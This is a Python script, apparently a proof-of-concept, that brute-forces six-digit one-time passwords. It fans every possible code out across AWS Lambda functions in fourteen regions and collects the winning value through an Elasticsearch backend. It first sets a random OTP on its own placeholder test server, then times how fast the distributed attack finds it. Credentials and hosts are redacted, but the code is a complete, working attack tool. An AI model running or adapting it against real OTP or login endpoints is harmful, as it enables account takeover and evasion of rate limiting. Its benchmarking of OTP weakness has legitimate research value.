#!/usr/bin/env pypy

# include the lib folder when searching for libraries
import sys
sys.path.insert(0, 'lib')
import site
site.addsitedir("lib")

import json, base64, uuid, traceback
import time
import pprint
import argparse
import uuid
import glob
import random
import urllib2
import re, binascii
import random
import requests

# boto3
import boto3
import botocore
from botocore.client import Config

import datetime
#import pytz
#tz = pytz.timezone('Asia/Singapore')
tz = None

import multiprocessing
import math

# lambda config
lambda_function_name = "smsotp"
lambda_aws_access_key = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
lambda_aws_secret_key = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
# aws regions
global regions_with_function

#regions_with_function = ['ap-southeast-1']

regions_with_function = [
'us-east-1',
'us-east-2',
'us-west-1',
'us-west-2',
'ca-central-1',
'eu-west-1',
'eu-west-2',
'eu-central-1',
'ap-southeast-1',
'ap-southeast-2',
'ap-northeast-1',
'ap-northeast-2',
'ap-south-1',
'sa-east-1'
]


otp_length = 6
otp_per_worker = 10000
otp_per_instance = 25

processes = multiprocessing.cpu_count() * 8
# safe value is 4


# elasticsearch backend
from elasticsearch import Elasticsearch
import elasticsearch
import certifi
es_url = "https://elk.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.io/"
es_index_results = "results"
es_index_commands = "commands"
es_index_jobs = "jobs"
es_user = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
es_pass = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"


def wait_for_result(jobid=None, action=None, start_time=None):
    #print("waiting for result for jobid: "+str(jobid)+" and action: "+str(action))
    # connect to elasticsearch
    try:
        es = Elasticsearch([es_url],
                           http_auth=(es_user, es_pass),
                           verify_certs=True,
                           ca_certs=certifi.where())
    except Exception as e:
        print("exception:", e.message, e.args, dir(e))
        traceback.print_exc()
    # now wait for the response to be in elasticsearch
    print(str(datetime.datetime.now(tz)) + " - waiting for answer in elasticsearch")
    es_item = None
    while es_item is None:
        try:
            es_item = es.get(index=str(es_index_results + '-' + action),
                             doc_type='result',
                             id=str(jobid))
        except elasticsearch.ElasticsearchException:
            time.sleep(1)
            pass
    print(str(datetime.datetime.now(tz)) + " - got answer from elasticsearch")
    pprint.pprint(es_item['_source'])
    otp_end_time = datetime.datetime.now(tz)
    print("found OTP in " + str( (otp_end_time - start_time).total_seconds() ))


def send_worker_task(commands, region=None):
    try:
        commands = json.dumps(commands)
        client = boto3.client('lambda',
            region_name=region,
            aws_access_key_id=lambda_aws_access_key,
            aws_secret_access_key=lambda_aws_secret_key,
            )
        client.invoke(
            FunctionName=lambda_function_name,
            InvocationType='Event',
            LogType='None',
            Payload=commands,
        )
        return True
    except Exception as e:
        print "Unexpected error"
        print e
        print traceback.format_exc()
        return False


def brute_otp_run_worker(task):
    #for task in tasklist:
    # keep trying in case of error
    success = False
    while not success:
        success = send_worker_task(commands=task['commands'], region=task['region'])


def brute_otp(backend=None, url=None, otplen=4, otp_per_worker=100):
    commands = {}
    commands['action'] = 'brute_otp'
    commands['id'] = str(uuid.uuid4())
    commands['url'] = url
    commands['allow_redirects'] = False
    commands['success'] = {}
    commands['success']['code'] = 302
    commands['success']['string'] = "Success"
    commands['otp_per_instance'] = otp_per_instance

    backend = {}
    backend['es_url'] = es_url
    backend['es_index_results'] = es_index_results
    backend['es_index_commands'] = es_index_commands
    backend['es_index_jobs'] = es_index_jobs
    backend['es_user'] = es_user
    backend['es_pass'] = es_pass

    if backend is not None:
        commands['backend'] = backend.copy()

    # create otp values
    otp_max = pow(10, otplen)
    otp_values = []
    for otp_value in range(0, otp_max):
        #print('{:0{width}d}'.format(otp_value, width=otplen))
        otp_values.append('{:0{width}d}'.format(otp_value, width=otplen))
    #print otp_values
    workers = math.ceil(float(otp_max) / float(otp_per_worker))
    print("{processes} processes to start {workers_per_region} workers for each of the {regions} regions".format(
        processes=processes,
        workers_per_region=(workers/len(regions_with_function)),
        regions=len(regions_with_function)
        )
    )
    print("will trigger {lambda_instances} instances of lambda".format(
        lambda_instances=(otp_max/otp_per_instance),
        )
    )

    raw_input("continue?")

    print(str(datetime.datetime.now(tz)) + " - starting brute_otp")
    start_time = datetime.datetime.now(tz)

    i = 0
    region_picker = 0
    tasklist = []

    while i < otp_max:
        commands['otp_values'] = otp_values[i:i + otp_per_worker]
        i = i + otp_per_worker
        task = {}
        task['commands'] = commands.copy()
        task['region'] = regions_with_function[region_picker]
        tasklist.append(task)
        region_picker += 1
        if region_picker >= len(regions_with_function):
            region_picker = 0
    random.shuffle(tasklist)


    print("Started job id: "+commands['id'])
    wait_for_result_proc = multiprocessing.Process(target=wait_for_result, kwargs={
        'jobid': commands['id'],
        'action': commands['action'],
        'start_time': start_time,
        })
    wait_for_result_proc.start()


    start_time_workers = datetime.datetime.now(tz)
    print(str(datetime.datetime.now(tz)) + " - starting workers")
    # now start the workers in parallel
    # this might make it take up a lot of memory
    # split the tasks over the available processors
    splittasks = len(tasklist) / processes
    if splittasks == 0:
        splittasks = 1
    pool = multiprocessing.Pool(processes=processes, maxtasksperchild=splittasks)
    pool.map_async(brute_otp_run_worker, tasklist)
    pool.close()
    pool.join()

    end_time_workers = datetime.datetime.now(tz)
    print(str(datetime.datetime.now(tz)) + " - done starting workers")
    print("finished starting workers in " + str((end_time_workers - start_time_workers).total_seconds()))


    wait_for_result_proc.join()


    # now wait for the whole brute_otp job to finish
    print(str(datetime.datetime.now(tz)) + " - waiting for job to complete")
    # connect to elasticsearch
    try:
        es = Elasticsearch([es_url],
                           http_auth=(es_user, es_pass),
                           verify_certs=True,
                           ca_certs=certifi.where())
    except Exception as e:
        print("exception:", e.message, e.args, dir(e))
        traceback.print_exc()
    es_job_item = None
    while es_job_item is None:
        try:
            es_job_item = es.get(index=str(es_index_jobs),
                             doc_type='result',
                             id=str(commands['id']))
        except elasticsearch.ElasticsearchException:
            pass
    print(str(datetime.datetime.now(tz)) + " - job completed")

    end_time = datetime.datetime.now(tz)
    print("brute_otp finished in " + str((end_time - start_time).total_seconds()))

print("======[OTP LENGTH "+str(otp_length)+"]===========")
#otp_rand_value = '9{:0{width}d}'.format(random.randint(0, pow(10, otp_length-1)), width=otp_length-1)
otp_rand_value = '{:0{width}d}'.format(random.randint(0, pow(10, otp_length)), width=otp_length)
print("setting random OTP value of length: "+str(otp_length)+" - OTP value is: "+str(otp_rand_value))
status_code = 0

while status_code is not 200:
    status_code = requests.get("https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.appspot.com/?setotp="+otp_rand_value).status_code
    if status_code is not 200:
        print("got error response: "+str(status_code)+" - waiting for 5 seconds to retry")
        time.sleep(5)
print("server is ready, starting brute force of OTP")

brute_otp(url="http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.appspot.com/?otp=",
    otplen=otp_length,
    otp_per_worker=otp_per_worker)
